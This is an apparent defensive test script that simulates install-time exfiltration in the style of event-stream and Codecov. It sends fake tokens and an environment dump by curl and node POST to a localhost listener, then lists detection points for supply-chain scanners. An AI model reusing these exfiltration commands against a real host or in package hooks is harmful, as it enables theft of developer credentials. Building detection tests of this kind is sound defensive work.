#!/bin/bash
# =============================================================================
# Fenceline Test: Outbound Data Exfiltration
# =============================================================================
# Simulates: Data exfiltration via outbound HTTP connection during install
# Real-world examples: event-stream (2018), Codecov (2021), Axios (2023)
#
# Attack pattern:
#   1. Package installs normally
#   2. Postinstall/preinstall hook makes outbound HTTP request
#   3. Sensitive data (env vars, tokens, SSH keys) sent to attacker server
#
# Safety: All connections to localhost:9999 only. Nothing leaves the machine.
# =============================================================================

set -euo pipefail

PORT=9999
SERVER_PID=""
PASS=0
FAIL=0

cleanup() {
    echo ""
    echo "[CLEANUP] Stopping localhost server..."
    if [ -n "$SERVER_PID" ]; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    echo "[CLEANUP] Done."
}
trap cleanup EXIT

echo "============================================="
echo "  Fenceline Test: Outbound Data Exfiltration"
echo "============================================="
echo ""

# --- SETUP ---
echo "[SETUP] Starting HTTP listener on localhost:$PORT..."
python3 -m http.server "$PORT" --bind 127.0.0.1 &>/dev/null &
SERVER_PID=$!
sleep 1

if ! kill -0 "$SERVER_PID" 2>/dev/null; then
    echo "[ERROR] Failed to start HTTP server on port $PORT. Is it already in use?"
    exit 1
fi
echo "[SETUP] Server running (PID $SERVER_PID)"
echo ""

# --- SIMULATION ---
echo "[SIMULATION] Simulating outbound exfiltration patterns..."
echo ""

# Pattern 1: curl with env vars in URL (Codecov-style)
echo "[SIM 1/3] Codecov-style: curl with stolen data in URL query string"
FAKE_TOKEN="ghp_SimulatedTokenNotReal1234567890ab"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:$PORT/upload?token=$FAKE_TOKEN&host=localhost" 2>/dev/null || echo "000")
echo "  -> curl to localhost:$PORT with token in query string (HTTP $HTTP_CODE)"
echo ""

# Pattern 2: POST with environment dump (event-stream-style)
echo "[SIM 2/3] event-stream-style: POST with environment variable dump"
FAKE_ENV="HOME=/Users/testuser\nNPM_TOKEN=npm_SimulatedNotReal\nAWS_SECRET=AKIAIOSFODNN7EXAMPLE"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "http://127.0.0.1:$PORT/exfil" \
    -d "$FAKE_ENV" 2>/dev/null || echo "000")
echo "  -> POST to localhost:$PORT with env dump (HTTP $HTTP_CODE)"
echo ""

# Pattern 3: Node.js making outbound request (postinstall hook)
echo "[SIM 3/3] Postinstall-style: node process making outbound HTTP request"
if command -v node &>/dev/null; then
    node -e "
        const http = require('http');
        const req = http.request({hostname: '127.0.0.1', port: $PORT, path: '/steal', method: 'POST'}, (res) => {
            process.stdout.write('  -> node HTTP POST to localhost:$PORT (status ' + res.statusCode + ')\n');
        });
        req.on('error', () => { process.stdout.write('  -> node connection made (server rejected, expected)\n'); });
        req.write(JSON.stringify({type: 'exfil', data: 'simulated_secret'}));
        req.end();
    " 2>/dev/null
    sleep 1
else
    echo "  -> [SKIP] node not available, simulating with curl"
    curl -s -o /dev/null -X POST "http://127.0.0.1:$PORT/steal" \
        -d '{"type":"exfil","data":"simulated_secret"}' 2>/dev/null || true
fi
echo ""

# --- DETECTION POINTS ---
echo "============================================="
echo "  DETECTION POINTS"
echo "============================================="
echo ""
echo "A supply chain detector should flag ALL of the following:"
echo ""
echo "  1. OUTBOUND HTTP from package install process"
echo "     -> Port: $PORT (not 443, not a known registry)"
echo "     -> Destination: any non-registry IP during install"
echo ""
echo "  2. SENSITIVE DATA IN REQUEST"
echo "     -> Tokens/credentials in URL query strings"
echo "     -> Environment variables in POST body"
echo "     -> SSH keys, AWS credentials, npm tokens"
echo ""
echo "  3. UNUSUAL PROCESS CHAIN"
echo "     -> npm/node spawning curl"
echo "     -> pip/python spawning HTTP requests to non-PyPI hosts"
echo "     -> Any install process contacting non-registry domains"
echo ""
echo "  4. NON-STANDARD PORT"
echo "     -> All legitimate package managers use port 443 only"
echo "     -> Any connection to port $PORT during install is suspicious"
echo ""
echo "[RESULT] Test simulation complete."
